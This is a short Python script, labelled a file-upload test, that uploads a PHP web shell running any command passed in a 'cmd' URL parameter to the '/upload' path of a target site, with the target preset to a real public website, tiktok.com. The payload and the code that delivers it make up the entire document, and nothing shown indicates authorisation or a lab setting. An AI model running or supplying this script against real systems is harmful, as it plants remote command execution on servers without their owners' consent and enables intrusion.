import requests

def test_file_upload(target_url):
    url = f"{target_url}/upload"
    files = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/x-php')}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        print("File upload successful, check if the uploaded file executes.")
    else:
        print("File upload failed.")

target_url = 'http://tiktok.com'  # Replace with the target website URL
test_file_upload(target_url)
